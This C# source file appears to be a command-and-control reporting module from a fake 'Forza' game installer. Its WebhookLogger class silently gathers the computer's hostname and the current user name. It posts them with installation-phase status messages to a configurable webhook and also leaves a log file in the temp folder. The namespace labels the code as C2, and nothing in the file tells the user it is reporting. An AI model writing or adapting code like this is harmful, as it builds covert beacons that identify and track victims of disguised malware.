using System;
using System.Net;
using System.Text;

namespace ForzaInstallation.C2
{
    internal static class WebhookLogger
    {
        private static string _webhookUrl = "";
        private static string _hostname = "?";
        private static string _username = "?";
        private static string _lastError = "";

        internal static void Init(string url)
        {
            _webhookUrl = url != null ? url : "";
            try { _hostname = Environment.MachineName; } catch { }
            try { _username = Environment.UserName; } catch { }
            FallbackLog("WebhookLogger.Init called");
        }

        internal static void Send(string phase, string status, string detail = "")
        {
            if (string.IsNullOrEmpty(_webhookUrl)) return;
            try
            {
                var ts = DateTime.UtcNow.ToString("HH:mm:ss");
                string safeDetail = EscapeJson(detail != null ? detail : "");
                var payload = "{\"content\":\"[" + ts + "] **" + EscapeJson(phase) + "** | " + EscapeJson(status) + " | " + EscapeJson(_hostname) + " | " + EscapeJson(_username) + " | " + safeDetail + "\",\"username\":\"ForzaInstaller\"}";
                var data = Encoding.UTF8.GetBytes(payload);
                var req = (HttpWebRequest)WebRequest.Create(_webhookUrl);
                req.Method = "POST";
                req.ContentType = "application/json";
                req.ContentLength = data.Length;
                req.Timeout = 5000;
                using (var s = req.GetRequestStream()) s.Write(data, 0, data.Length);
                using (var r = (HttpWebResponse)req.GetResponse()) { }
            }
            catch (Exception ex)
            {
                _lastError = "Webhook send failed: " + (ex.Message != null ? ex.Message : "unknown");
                FallbackLog(_lastError);
            }
        }

        internal static string GetLastError()
        {
            return _lastError;
        }

        internal static void FallbackLogDirect(string message)
        {
            FallbackLog(message);
        }

        private static void FallbackLog(string message)
        {
            try
            {
                System.IO.File.AppendAllText(
                    System.IO.Path.Combine(System.IO.Path.GetTempPath(), "fz_install.log"),
                    DateTime.UtcNow.ToString("o") + " " + (message != null ? message : "") + "\n"
                );
            }
            catch { }
        }

        private static string EscapeJson(string s)
        {
            if (string.IsNullOrEmpty(s)) return "";
            var sb = new StringBuilder(s.Length);
            foreach (char c in s)
            {
                switch (c)
                {
                    case '\\': sb.Append("\\\\"); break;
                    case '"': sb.Append("\\\""); break;
                    case '\n': sb.Append("\\n"); break;
                    case '\r': sb.Append("\\r"); break;
                    case '\t': sb.Append("\\t"); break;
                    case '\b': sb.Append("\\b"); break;
                    case '\f': sb.Append("\\f"); break;
                    default:
                        if (c < 0x20)
                            sb.Append(string.Format("\\u{0:X4}", (int)c));
                        else
                            sb.Append(c);
                        break;
                }
            }
            return sb.ToString();
        }
    }
}
